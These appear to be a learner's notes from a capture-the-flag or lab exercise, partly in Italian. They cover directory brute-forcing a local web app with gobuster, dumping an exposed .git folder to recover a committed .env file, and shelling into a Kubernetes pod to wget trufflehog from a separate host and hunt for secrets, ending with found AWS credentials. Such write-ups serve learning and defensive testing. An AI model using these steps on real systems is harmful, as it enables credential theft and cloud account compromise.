



wordlist

```bash
git clone -j`nproc` https://github.com/drtychai/wordlists 
```


- **`-j`** (job) indica al comando quanti lavori/processi far girare contemporaneamente, per sfruttare tutti i core e velocizzare l'operazione.

- `npro` stampa i numeri di core dispobili su linux


run go buster on the `http:127.0.0.1:1230`

```bash
# Pull the latest image
docker pull ghcr.io/oj/gobuster:latest
```


```bash
# Run container
docker run --rm -it --network host -v /usr/share/wordlists:/wordlists --entrypoint sh ghcr.io/oj/gobuster:latest
```


```bash
./gobuster dir -u http://127.0.0.1:1230 -w /wordlists/dirb/common.txt
```

nothing so i still search under `.git` folder 

Install git-dumper

interesting commit at `d7c173ad183c574109cd5c4c648ffe551755b576` 

```bash
git show d7c173ad183c574109cd5c4c648ffe551755b576
```

![[Pasted image 20260815154707.png]]

On master therin't a `.env` file![[Pasted image 20260815161201.png]]

```bash
git checkout d7c173ad183c574109cd5c4c648ffe551755b576
```

![[Pasted image 20260815161351.png]]

# Second method
if we are in already in the cluser we can do the same things in the pod... or we can use **trufflehog**

```bash
k exec -it build-code-deployment-84fb858df9-74rcg -- /bin/sh
```

```bash
chmod +x trufflehog
```

in the pod 
```bash
wget -c http://192.168.1.84:8000/trufflehog
```

![[Pasted image 20260815163506.png]]


## Treasure

We have found AWS credential 